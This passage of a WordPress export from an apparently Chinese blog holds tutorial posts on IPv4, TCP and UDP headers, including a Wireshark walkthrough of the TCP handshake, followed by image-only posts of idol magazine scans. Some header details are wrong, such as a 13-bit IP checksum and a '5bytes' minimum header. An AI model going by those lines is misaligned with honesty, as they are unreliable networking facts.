							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[196]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>IP协议分析</title>
		<link>https://www.nervgeek.com/2015/10/15/ip%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90/</link>
		<pubDate>Thu, 15 Oct 2015 10:27:16 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=142</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>网际协议</strong>(Internet Protocol，IP)，或称互联网协议，是用于<a href="http://zh.wikipedia.org/wiki/%E6%8A%A5%E6%96%87%E4%BA%A4%E6%8D%A2" target="_blank" rel="nofollow">报文交换</a>网络的一种面向数据的协议。
IP是在<a href="http://zh.wikipedia.org/wiki/TCP/IP%E5%8D%8F%E8%AE%AE" target="_blank" rel="nofollow">TCP/IP协议</a>中<a href="http://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%B1%82" target="_blank" rel="nofollow">网络层</a>的主要协议，任务是仅仅根据源主机和目的主机的地址传送数据。为此目的，IP定义了寻址方法和数据报的封装结构 。第一个架构的主要版本，现在称为<a href="http://zh.wikipedia.org/wiki/IPv4" target="_blank" rel="nofollow">IPv4</a>，仍然是最主要的互联网协议，尽管世界各地正在积极部署<a href="http://zh.wikipedia.org/wiki/IPv6" target="_blank" rel="nofollow">IPv6</a>。
IPV4地址是一个4byte*8bit/byte = 32 bit 的地址，我们常用点分十进制表示，其中还分为五类IP，具体的网络掩码、CIDR不多说，让我们分析下IPV4头（域前面的数字为其大小 比特为单位）
<strong>2.1 IP头</strong>
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/dd7f15a495404bf1c3f0c2099502956d.jpg" alt="" />
<!--more-->

<ul>
    <li><strong>版本号Version(4bit)：</strong>指出当前使用的 IP 版本，IPV4。</li>
    <li><strong>头部长度IP Header Length (IHL) (4bit)：</strong> 指数据报协议头<a href="http://baike.baidu.com/view/87781.htm" target="_blank" rel="nofollow">长度</a>，表示协议头具有32位<a href="http://baike.baidu.com/view/731.htm" target="_blank" rel="nofollow">字长</a>的数量。指向数据起点。正确协议头最小值为5bytes。</li>
    <li><strong>服务类型Type-of-Service (8bit)：</strong> 指出上层协议对处理当前数据报所期望的服务质量，并对数据报按照重要性级别进行分配。这些8<a href="http://baike.baidu.com/view/2797777.htm" target="_blank" rel="nofollow">位字段</a>用于分配优先级、延迟、吞吐量以及可靠性。</li>
    <li><strong>总长度Total Length(16bit)：</strong> 指定整个 IP <a href="http://baike.baidu.com/view/25880.htm" target="_blank" rel="nofollow">数据包</a>的字节<a href="http://baike.baidu.com/view/87781.htm" target="_blank" rel="nofollow">长度</a>，包括数据和协议头。其最大值为65,535字节。典型的<a href="http://baike.baidu.com/view/23880.htm" target="_blank" rel="nofollow">主机</a>可以接收576字节的数据报。</li>
    <li><strong>标识 Identification(16bit)：</strong> 包含一个整数，用于识别当前数据报。该字段由发送端分配帮助接收端集中数据报分片。</li>
    <li><strong>标志字段 Flags(3bit)：</strong> 其中最低位(MF)控制分片，存在下一个分片置为1，否则置0代表结束分片。中间位(DF)指出<a href="http://baike.baidu.com/view/25880.htm" target="_blank" rel="nofollow">数据包</a>是否可进行分片。第三位即最高位保留不使用，但是必须为0。</li>
    <li><strong>分片偏移 Fragment Offset(13bit）：</strong> 指出与源数据报的起始端相关的分片数据位置，支持目标IP适当重建源数据报。</li>
    <li><strong>生存时间 Time-to-Live(8bit)：</strong> 是一种计数器，在丢弃数据报的每个点值依次减1直至减少为0。这样确保<a href="http://baike.baidu.com/view/25880.htm" target="_blank" rel="nofollow">数据包</a>无止境的环路过程(即TTL)。</li>
    <li><strong>协议Protocol(8bit)：</strong> 指出在 IP 处理过程完成之后，有哪种上层协议接收导入<a href="http://baike.baidu.com/view/25880.htm" target="_blank" rel="nofollow">数据包</a>。</li>
    <li><strong>校验和 Header Checksum(13bit)： </strong>帮助确保 IP 协议头的完整性。由于某些协议头字段的改变，如生存期(Time to Live)，这就需要对每个点重新计算和检验。Internet 协议头需要进行处理。</li>
    <li><strong>源地址Source Address(32bit)：</strong> 源<a href="http://baike.baidu.com/view/23880.htm" target="_blank" rel="nofollow">主机</a>IP地址。</li>
    <li><strong>目标地址Desti</strong><a href="http://baike.baidu.com/view/16102.htm" target="_blank" rel="nofollow"><strong>nat</strong></a><strong>ion Address(32bit)：</strong> 目标<a href="http://baike.baidu.com/view/23880.htm" target="_blank" rel="nofollow">主机</a>IP地址。</li>
    <li><strong>选项Options：</strong>允许 IP 支持各种选项，如安全性。</li>
    <li><strong>数据Data：</strong>包括上层<a href="http://baike.baidu.com/view/1527.htm" target="_blank" rel="nofollow">信息</a>。</li>
</ul>

<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/69067a9e25d0ef9e35fc9c06e8934aa5.png" alt="" />
从上图我们可以知道，其IP版本为IPV4及其标示，TTL值，上层协议为ICMP 等信息。
<strong>2.2 存活时间TTL</strong>
生存时间指定<a href="http://baike.baidu.com/view/25880.htm" target="_blank" rel="nofollow">数据包</a>被<a href="http://baike.baidu.com/view/1360.htm" target="_blank" rel="nofollow">路由器</a>丢弃之前允许通过的网段数量。它是IP协议包中的一个值，它告诉<a href="http://baike.baidu.com/view/3487.htm" target="_blank" rel="nofollow">网络</a>，<a href="http://baike.baidu.com/view/25880.htm" target="_blank" rel="nofollow">数据包</a>在网络中的时间是否太长而应被丢弃（每经过一个路由器TTL值会至少减1）。
我们常用ping命令(ICMP协议)测试网络的连通性：
<strong><img src="https://www.nervgeek.com/wp-content/uploads/2015/10/2-107289ead46433042ad0c59296923672-1-1.png" alt="" />
</strong>
在第一个ICMP请求包发送时其TTL为128
<strong><img src="https://www.nervgeek.com/wp-content/uploads/2015/10/6a36e82595b02592c49ed0cfd64ac25d.png" alt="" />
</strong>   之后目标主机返回给发送者
<strong><img src="https://www.nervgeek.com/wp-content/uploads/2015/10/fdc2a5921734dd2bd22f4e03f5cb5eb2.png" alt="" /></strong>
&nbsp;
发现其TTL值减一了，说明两台主机10.10.0.3和192.168.0.128之间隔了1台路由器。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>142</wp:post_id>
		<wp:post_date><![CDATA[2015-10-15 18:27:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-15 10:27:16]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[ip%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="ip"><![CDATA[ip]]></category>
		<category domain="post_tag" nicename="%e5%8d%8f%e8%ae%ae"><![CDATA[协议]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
		<category domain="post_tag" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[178]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>TCP协议分析</title>
		<link>https://www.nervgeek.com/2015/10/15/tcp%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90/</link>
		<pubDate>Thu, 15 Oct 2015 10:35:03 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=154</guid>
		<description></description>
		<content:encoded><![CDATA[TCP，全称Transfer Control Protocol，中文名为传输控制协议，它工作在OSI的<strong>传输层</strong>，提供面向连接的可靠传输服务。
TCP的工作主要是建立连接，然后从应用层程序中接收数据并进行传输。TCP采用虚电路连接方式进行工作，在发送数据前它需要在发送方和接收方建立一个连接，数据在发送出去后，发送方会等待接收方给出一个确认性的应答，否则发送方将认为此数据丢失，并重新发送此数据。
&nbsp;
&nbsp;
<strong>3.1 TCP头</strong>
TCP报头总长最小为20个字节
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/3-14d487b3621ee6dbf9dfefddc1be5d72-1-1.jpg" alt="" border="0" hspace="0" vspace="0" />
<!--more-->

<ul>
    <li><strong>源端口 Source port (16bit)：</strong>用来传输数据包的端口。</li>
    <li><strong>目的端口 Destination port (16bit)：</strong>指定了接受端的端口号。</li>
    <li><strong>序号 Sequence number(32bit)：</strong>指明了段在即将传输的段序列中的位置，保证其不缺失。</li>
    <li><strong>确认号 Acknowledgment number(32bit)：</strong>规定成功收到段的序列号，确认序号包含发送确认的一端所期望收到的下一个序号。</li>
</ul>

&nbsp;

<ul>
    <li><strong>标志 Flags(6bit):</strong> 常用 SYN、ACK、PSH、RST、URG、FIN</li>
</ul>

SYN： 表示同步
ACK： 表示确认
PSH： 表示尽快的将数据送往接收进程
RST： 表示复位连接
URG： 表示紧急指
FIN： 表示发送方完成数据发送
&nbsp;

<ul>
    <li><strong>窗口 Windows size：</strong>TCP接收方的缓冲的字节大小。</li>
    <li><strong>校验和 Checksum：</strong>校验和包含TCP段头和数据部分，用来校验段头和数据部分的可靠性。</li>
    <li><strong>紧急指针 Urgent Pointer：</strong>指明段中包含紧急信息，只有当URG标志置1时紧急指针才有效。</li>
    <li><strong>选项 Option：</strong>指定了公认的段大小，时间戳，选项字段的末端，以及指定了选项字段的边界选项。</li>
</ul>

<strong>3.2  TCP三次握手</strong>
TCP三次握手的过程是这样的，首先发送方主机向接收方主机发起一个建立连接的同步（SYN）请求，接收方主机在收到这个请求后向送方主机回复一个同步/确认（SYN/ACK）应答，发送方主机收到此包后再向接收方主机发送一个确认（ACK），此时TCP连接成功建立。
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/1-1dbe63a82b89a6ae00d764e23b2b5142-1-1.png" alt="" border="0" hspace="0" vspace="0" />
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/d575a935e7a2d3a822364a915c413e45.png" alt="" border="0" hspace="0" vspace="0" />
ok，开始分析！（注意其方向）
我们先分析第一个包，我们叫也可以叫它SYN包，可以看见其Flags域为 SYN
（客户端---&gt;服务端）
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/5-1d40b7e73e4783f3fa45de983f238bd3-1-1.png" alt="" border="0" hspace="0" vspace="0" />
从以上包中 我们可以得到其发送包的源端口（随机高端口），目的端口80（说明为上层为HTTP服务）此时Sequence number域为0（0为相对值，实际的值并不为0，若要显示其实际值需在wireshark中设置，为了下面的理解我又截取了sequence的实际值的包。）
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/4-175a06fe1cf59f9592a652f0bd98b43f-1-1.png" alt="" border="0" hspace="0" vspace="0" />
这个序号代表了客户端发送的这个包。
我们展开SYN域看看
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/3-1d42334c1bdad8938a30a60be5cb099a-1-1.png" alt="" border="0" hspace="0" vspace="0" />

<h1>发现其SYN为1 ，根据其二进制1所在的位置我们不难发现转成16进制后的值为0x002</h1>

我们展开第二个包
（服务端---&gt;客户端)
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/9818855e559639bcd7f4f39ee3e838aa.png" alt="" border="0" hspace="0" vspace="0" />
可以发现多出了一个Acknowledgment number 其值为1 （也是相对值），Acknowledgment的意思为请求，所以加1，表示请求下一个包（间接表明了上一个SYN包已经收到），然后添加一个Sequence number值为0（相对值，但是和前一个包的Sequence number不等同！），代表着服务端发送的数据包。
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/cfffdd4c0854c9be6f081ccc35a230d1.png" alt="" border="0" hspace="0" vspace="0" />

<h1>在Flags域中可以发现Acknowledgment和Syn 都为1，根据其1的位置，转成16进制为0x012</h1>

最后我们来看第三个包，Sequence number和Acknowledgment number都为1。
（客户端---&gt;服务端）
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/8160f1cc2c0d3b690a98acd678716665.png" alt="" border="0" hspace="0" vspace="0" />
改成具体值后发现其Sequence number并无改变（没有用处），而Acknowledgment则在之前SYN/ACK包的sequence上加1了。（握手完成）
<img src="https://www.nervgeek.com/wp-content/uploads/2015/10/4-1a50bdd51fb11d377ace2f7104c8beba-1-1.png" alt="" border="0" hspace="0" vspace="0" />
其实三次握手就是相互确认的过程，SYN到对方，对方给你一个ACK，之后对方给你个SYN，你给对方一个ACK。就这么简单。
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>154</wp:post_id>
		<wp:post_date><![CDATA[2015-10-15 18:35:03]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-15 10:35:03]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[tcp%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="tcp"><![CDATA[TCP]]></category>
		<category domain="post_tag" nicename="%e5%8d%8f%e8%ae%ae"><![CDATA[协议]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
		<category domain="post_tag" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[181]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>UDP协议分析</title>
		<link>https://www.nervgeek.com/2015/10/15/udp%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90/</link>
		<pubDate>Thu, 15 Oct 2015 10:37:11 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=166</guid>
		<description></description>
		<content:encoded><![CDATA[UDP 是User Datagram Protocol的简称， 中文名是用户数据报协议，是OSI中一种<strong>无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。</strong>
4.1 UDP头
<img class="alignnone size-full wp-image-167" src="https://www.nervgeek.com/wp-content/uploads/2016/01/e04614b603f0aefe624d3907d5390f65.png" alt="2265310612668040301" width="500" height="178" />

<ul>
    <li><strong>源</strong><strong>端口号</strong><strong> Source port(16bit): </strong>传输数据包的端口。</li>
    <li><strong>目标端口号 Destination port(16bit)：</strong> 数据包到达的端口。</li>
    <li><strong>数据报</strong><strong>长度 Length（16bit）：</strong>数据的字节长。</li>
    <li><strong>校验值 Checksum (16bit): </strong>确认UDP头及数据到达时的完整性。</li>
</ul>

<img class="alignnone size-full wp-image-168" src="https://www.nervgeek.com/wp-content/uploads/2016/01/31ec6c305ae8419700b2300ed82af03b.png" alt="6608429920794544332" width="500" height="68" />
UDP协议比较简单，因为它并不关心数据传输是否可靠，则很多基于UDP协议的应用都需要使用特殊的验证保证其可靠。它的上层协议有DHCP、DNS。
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>166</wp:post_id>
		<wp:post_date><![CDATA[2015-10-15 18:37:11]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-15 10:37:11]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[udp%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="udp"><![CDATA[UDP]]></category>
		<category domain="post_tag" nicename="%e5%8d%8f%e8%ae%ae"><![CDATA[协议]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
		<category domain="post_tag" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[152]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>杂志《UTB》2014年9月刊-宮脇咲良 cut</title>
		<link>https://www.nervgeek.com/2016/02/20/%e6%9d%82%e5%bf%97%e3%80%8autb%e3%80%8b2014%e5%b9%b49%e6%9c%88%e5%88%8a-%e5%ae%ae%e8%84%87%e5%92%b2%e8%89%af-cut/</link>
		<pubDate>Sat, 20 Feb 2016 14:38:08 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=979</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/16-20151012195038.jpg" rel="attachment wp-att-980"><img class="alignnone size-full wp-image-980" src="https://www.nervgeek.com/wp-content/uploads/2016/02/16-20151012195038.jpg" alt="16-20151012195038" width="1678" height="2400" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/24-20151012195042.jpg" rel="attachment wp-att-981"><img class="alignnone size-full wp-image-981" src="https://www.nervgeek.com/wp-content/uploads/2016/02/24-20151012195042.jpg" alt="24-20151012195042" width="1744" height="2400" /></a>
<!--more-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/31-20151012195047.jpg" rel="attachment wp-att-982"><img class="alignnone size-full wp-image-982" src="https://www.nervgeek.com/wp-content/uploads/2016/02/31-20151012195047.jpg" alt="31-20151012195047" width="1671" height="2400" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/12-20151012195036.jpg" rel="attachment wp-att-983"><img class="alignnone size-full wp-image-983" src="https://www.nervgeek.com/wp-content/uploads/2016/02/12-20151012195036.jpg" alt="12-20151012195036" width="1691" height="2400" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/13-20151012195036.jpg" rel="attachment wp-att-984"><img class="alignnone size-full wp-image-984" src="https://www.nervgeek.com/wp-content/uploads/2016/02/13-20151012195036.jpg" alt="13-20151012195036" width="1676" height="2400" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>979</wp:post_id>
		<wp:post_date><![CDATA[2016-02-20 22:38:08]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-20 14:38:08]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%9d%82%e5%bf%97%e3%80%8autb%e3%80%8b2014%e5%b9%b49%e6%9c%88%e5%88%8a-%e5%ae%ae%e8%84%87%e5%92%b2%e8%89%af-cut]]></wp:post_name>
		<wp:status><![CDATA[private]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e5%86%99%e7%9c%9f"><![CDATA[写真]]></category>
		<category domain="post_tag" nicename="%e5%ae%ae%e8%84%87%e5%92%b2%e8%89%af"><![CDATA[宮脇咲良]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[982]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[926]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>杂志《UTB》2014年10月刊-宮脇咲良 cut</title>
		<link>https://www.nervgeek.com/2016/02/20/%e6%9d%82%e5%bf%97%e3%80%8autb%e3%80%8b2014%e5%b9%b410%e6%9c%88%e5%88%8a-%e5%ae%ae%e8%84%87%e5%92%b2%e8%89%af-cut/</link>
		<pubDate>Sat, 20 Feb 2016 14:43:52 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=987</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/1-20151012195005.jpg" rel="attachment wp-att-988"><img class="alignnone size-full wp-image-988" src="https://www.nervgeek.com/wp-content/uploads/2016/02/1-20151012195005.jpg" alt="1-20151012195005" width="1080" height="1552" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/2-20151012195006.jpg" rel="attachment wp-att-989"><img class="alignnone size-full wp-image-989" src="https://www.nervgeek.com/wp-content/uploads/2016/02/2-20151012195006.jpg" alt="2-20151012195006" width="1080" height="1533" /></a><!--more--> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/3-20151012195006.jpg" rel="attachment wp-att-990"><img class="alignnone size-full wp-image-990" src="https://www.nervgeek.com/wp-content/uploads/2016/02/3-20151012195006.jpg" alt="3-20151012195006" width="1080" height="1551" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/4-20151012195007.jpg" rel="attachment wp-att-991"><img class="alignnone size-full wp-image-991" src="https://www.nervgeek.com/wp-content/uploads/2016/02/4-20151012195007.jpg" alt="4-20151012195007" width="1080" height="1555" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/5-20151012195007.jpg" rel="attachment wp-att-992"><img class="alignnone size-full wp-image-992" src="https://www.nervgeek.com/wp-content/uploads/2016/02/5-20151012195007.jpg" alt="5-20151012195007" width="1080" height="812" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/6-20151012195008.jpg" rel="attachment wp-att-993"><img class="alignnone size-full wp-image-993" src="https://www.nervgeek.com/wp-content/uploads/2016/02/6-20151012195008.jpg" alt="6-20151012195008" width="1080" height="1533" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/7-20151012195009.jpg" rel="attachment wp-att-994"><img class="alignnone size-full wp-image-994" src="https://www.nervgeek.com/wp-content/uploads/2016/02/7-20151012195009.jpg" alt="7-20151012195009" width="1080" height="1493" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/8-20151012195009.jpg" rel="attachment wp-att-995"><img class="alignnone size-full wp-image-995" src="https://www.nervgeek.com/wp-content/uploads/2016/02/8-20151012195009.jpg" alt="8-20151012195009" width="1080" height="1544" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/9-20151012195010.jpg" rel="attachment wp-att-996"><img class="alignnone size-full wp-image-996" src="https://www.nervgeek.com/wp-content/uploads/2016/02/9-20151012195010.jpg" alt="9-20151012195010" width="1080" height="1559" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/10-20151012195010.jpg" rel="attachment wp-att-997"><img class="alignnone size-full wp-image-997" src="https://www.nervgeek.com/wp-content/uploads/2016/02/10-20151012195010.jpg" alt="10-20151012195010" width="1080" height="1550" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>987</wp:post_id>
		<wp:post_date><![CDATA[2016-02-20 22:43:52]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-20 14:43:52]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%9d%82%e5%bf%97%e3%80%8autb%e3%80%8b2014%e5%b9%b410%e6%9c%88%e5%88%8a-%e5%ae%ae%e8%84%87%e5%92%b2%e8%89%af-cut]]></wp:post_name>
		<wp:status><![CDATA[private]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="akb"><![CDATA[akb]]></category>
		<category domain="post_tag" nicename="akb48"><![CDATA[akb48]]></category>
		<category domain="post_tag" nicename="akb48g"><![CDATA[akb48g]]></category>
		<category domain="post_tag" nicename="akb48group"><![CDATA[akb48group]]></category>
		<category domain="post_tag" nicename="akbg"><![CDATA[akbg]]></category>
		<category domain="post_tag" nicename="hkt48"><![CDATA[HKT48]]></category>
		<category domain="category" nicename="%e5%86%99%e7%9c%9f"><![CDATA[写真]]></category>
		<category domain="post_tag" nicename="%e5%ae%ae%e8%84%87%e5%92%b2%e8%89%af"><![CDATA[宮脇咲良]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[993]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
